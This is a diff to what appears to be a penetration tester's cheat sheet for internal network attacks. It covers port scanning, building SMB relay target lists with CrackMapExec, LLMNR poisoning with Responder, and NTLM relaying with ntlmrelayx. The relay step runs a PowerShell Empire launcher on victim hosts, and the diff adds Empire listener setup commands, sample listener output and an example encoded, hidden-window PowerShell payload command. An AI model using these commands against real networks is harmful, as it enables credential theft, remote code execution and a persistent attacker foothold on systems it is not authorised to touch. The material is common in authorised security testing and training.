@@ -3,7 +3,38 @@ service detection: nmap -vv -Pn -sTV --open --reason --top-ports 1000 --script s
 service detection: masscan --rate 100000 --top-ports 1000 --banners -iL
 
 llmnr: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+Generate a list of targets
 llmnr: cme smb <CIDR> --gen-relay-list targets.txt
-llmnr: python Responder.py -I <interface> -r -d -w
-llmnr: ntlmrelayx.py -tf targets.txt
-llmnr: ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
+	OR
+llmnr: crackmapexec smb <CIDR> --gen-relay-list targets.lst
+
+
+-- NTLM Relay -- 
+llmnr: sudo ntlmrelayx.py -tf targets.txt
+llmnr: sudo ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher/agent here - see below>
+llmnr: sudo impacket-ntlmrelayx -tf targets.txt -c <insert your Empire Powershell launcher/agent here - see below>
+
+	--- PowershellEmpire Launcher Build (!! Run as sudo or root)
+	(Empire) > listeners
+	(Empire: listeners) > uselistener http 
+	(Empire: listeners/http) > set Port 80 #or other port
+	(Empire: listeners/http) >set SlackChannel https://hooks.slack.com/services/<codepath>/  #OPTIONAL
+	(Empire) > agents
+	(Empire: agents) > listeners
+
+		[*] Active listeners:
+
+		  Name              Module          Host                                 Delay/Jitter   KillDate
+		  ----              ------          ----                                 ------------   --------
+		  http              http            http://192.168.20.130:80             5/0.0                      
+
+	(Empire: listeners) > launcher powershell http
+	
+		Outputs the powershell agent - use as needed. Example Below. 
+		$> impacket-ntlmrelayx -tf targets.txt -c "powershell -noP -sta -w 1 -enc Encoded-string=="
+
+
+
+Make sure Responder.conf (typically /etc/responder/Responder.conf) has SMB and HTTP set to Off
+llmnr: Responder often found here: /usr/share/responder/Responder.py -- but not always.
+llmnr: sudo python Responder.py -I <interface> -r -d -w
